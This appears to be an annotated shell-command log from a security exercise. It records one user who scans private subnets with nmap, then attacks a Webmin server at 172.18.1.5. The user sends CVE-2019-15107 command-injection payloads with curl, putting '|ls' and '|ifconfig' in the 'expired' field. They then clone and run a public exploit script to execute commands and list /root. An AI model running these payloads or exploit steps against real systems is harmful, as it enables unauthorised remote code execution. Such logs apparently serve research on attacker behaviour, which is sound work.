User 85 start time 1594798160 end 1594805698
PADDING
PADDING
PADDING
INPUT|85--0|U|1594798160|85|ls|OUTPUT
INPUT|85--1|U|1594798167|85|cat ssh2john.py|OUTPUT
INPUT|85--2|U|1594798199|85|clear|OUTPUT
INPUT|85--3|U|1594798200|85|ls|OUTPUT
INPUT|85--4|U|1594798205|85|nmap|OUTPUT
INPUT|85--5|U|1594798208|85|ifconfig|OUTPUT
INPUT|85--6|A0 |1594798244|85|nmap 192.168.128.0|OUTPUT
INPUT|85--7|A0 |1594798291|85|nmap 192.168.128.0/24|OUTPUT
INPUT|85--8|U|1594798379|85|ifconfig|OUTPUT
INPUT|85--9|A0 |1594798392|85|nmap 10.1.135.0/24|OUTPUT
INPUT|85--10|A0 |1594798462|85|nmap 10.1.135.0/|OUTPUT
INPUT|85--11|A0 |1594798466|85|nmap 10.1.135.0/16|OUTPUT
INPUT|85--12|U|1594798595|85|ping 172.18.1.5|OUTPUT
INPUT|85--13|A0 |1594798606|85|nmap 172.18.1.5|OUTPUT
INPUT|85--14|A0 A1 |1594798952|85|nmap -sV 172.18.1.5|OUTPUT
INPUT|85--15|U|1594799829|85|curl http://172.18.1.5:10000/password_change.cgi -d 'user=root&pam=&expired=2|ls&old=foo&new1=bar&new2=bar' -HReferer: http://172.18.1.5:10000|OUTPUT
INPUT|85--16|U|1594800177|85|curl http://172.18.1.5:10000/password_change.cgi -d 'user=root&pam=&expired=2|ifconfig&old=foo&new1=bar&new2=bar' -HReferer: http://172.18.1.5:10000|OUTPUT
INPUT|85--17|U|1594800211|85|git clone https://github.com/jas502n/CVE-2019-15107|OUTPUT
INPUT|85--18|U|1594800216|85|ls|OUTPUT
INPUT|85--19|U|1594800220|85|cd CVE-2019-15107/|OUTPUT
INPUT|85--20|U|1594800222|85|ls|OUTPUT
INPUT|85--21|U|1594800230|85|python CVE_2019_15107.py|OUTPUT
INPUT|85--22|U|1594800242|85|cat README.md|OUTPUT
INPUT|85--23|U|1594800368|85|python CVE_2019_15107.py https://172.18.1.5:10000|OUTPUT
INPUT|85--24|U|1594800386|85|python CVE_2019_15107.py https://172.18.1.5:10000 id|OUTPUT
INPUT|85--25|U|1594800477|85|python CVE_2019_15107.py http://172.18.1.5:10000 ls|OUTPUT
INPUT|85--26|U|1594800504|85|python CVE_2019_15107.py http://172.18.1.5:10000 pwd|OUTPUT
INPUT|85--27|U|1594800515|85|ls /root|OUTPUT
INPUT|85--28|U|1594800525|85|python CVE_2019_15107.py http://172.18.1.5:10000 ls /root|OUTPUT
INPUT|85--29|U|1594800540|85|python CVE_2019_15107.py http://172.18.1.5:10000 ls /root/|OUTPUT
